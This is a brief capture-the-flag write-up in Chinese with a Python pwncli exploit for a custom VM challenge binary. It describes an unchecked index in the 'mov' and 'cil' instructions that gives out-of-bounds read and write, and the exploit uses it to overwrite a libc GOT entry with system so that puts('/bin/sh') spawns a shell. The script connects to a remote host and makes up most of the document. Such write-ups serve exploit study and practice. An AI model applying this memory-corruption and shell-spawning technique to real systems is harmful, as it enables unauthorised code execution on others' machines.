
`mov` `cil` 等操作对 `index` 没有检查导致的越界读写

修改`puts`中调用的`libc.got`为`system`，`puts("/bin/sh\x00")`即可

```
#!/usr/bin/env python3
from pwncli import *

context.terminal = ["tmux", "splitw", "-h", "-l", "122"]
local_flag = sys.argv[1] if len(sys.argv) == 2 else 0

if local_flag == "remote":
    addr = '121.42.242.203 9999'
    host = addr.split(' ')
    gift.io = remote(host[0], host[1])
    gift.remote = True
else:
    gift.io = process('./pwn')
    if local_flag == "nodbg":
        gift.remote = True
init_x64_context(gift.io, gift)
libc = load_libc()
gift.elf = ELF('./pwn')
cmd = '''
    b *$rebase(0xED7A)
    # mov
    b *$rebase(0xEE19)
    # push
    b *$rebase(0xFBE1)
    # ods
    #b *$rebase(0xFA9F)
    # cil
    b *$rebase(0xEF41)
    # inc
    b *$rebase(0xC79D)
    # ipf

    c
    set $context=$rbp-0x298
    set $value=$rbp-0xB8
'''
launch_gdb(cmd)

payload = (
    f'''
data binsh "/bin/sh\x00"
func:
    ret
_start:
._start:
mov {0xf47ff + 0x21a02} 0
cil {- 0x50d70 + 0x28030} 4
sub 4 0
mov 0 {0xf47ff + 0x21a09}
call func
ods binsh
'''
    + "EOF"
)

ru(b'Code :')
sl(payload)

ia()
```
